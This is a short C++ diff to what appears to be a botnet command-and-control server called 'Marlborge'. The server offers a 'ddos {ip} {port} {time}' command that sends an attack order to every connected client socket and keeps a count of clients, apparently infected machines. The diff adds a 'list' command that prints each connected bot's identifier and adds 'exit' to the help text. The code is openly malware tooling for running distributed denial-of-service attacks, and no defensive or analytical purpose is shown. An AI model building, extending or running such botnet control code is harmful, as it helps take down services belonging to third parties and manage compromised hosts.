@@ -18,6 +18,7 @@ enum COMMAND {
 	HELP = 0x01,
 	DDOS = 0x02,
 	CLIENTS = 0x03,
+	LIST = 0x04,
 	CLEAR = 0x0F,
 	EXIT = 0xFF,
 	UNKNOWN = 0x00
@@ -90,7 +91,8 @@ int main() {
 		case HELP:
 			std::cout << "Marlborge command list:\n"
 				"1.- ddos {ip} {port} {time}\n"
-				"2.- clients\n";
+				"2.- clients\n"
+				"3.- exit\n";
 			break;
 		case CLIENTS:
 			std::cout << "Connected clients: " << nClientCount << std::endl;
@@ -124,6 +126,16 @@ int main() {
 			for (std::pair<std::string, SOCKET> client : clients) {
 				send(client.second, buffer, nBufferSize, 0);
 			}
+		}
+			break;
+		case LIST:
+		{
+			std::string outputStr;
+			for (std::pair<std::string, SOCKET> client : clients) {
+				outputStr.append(client.first + "\n");
+			}
+
+			std::cout << outputStr << std::endl;
 		}
 			break;
 		case CLEAR:
@@ -218,6 +230,9 @@ COMMAND GetCommand(std::string cmd) {
 
 	if (cmd == "clients")
 		command = CLIENTS;
+
+	if (cmd == "list")
+		command = LIST;
 
 	if (cmd == "clear")
 		command = CLEAR;
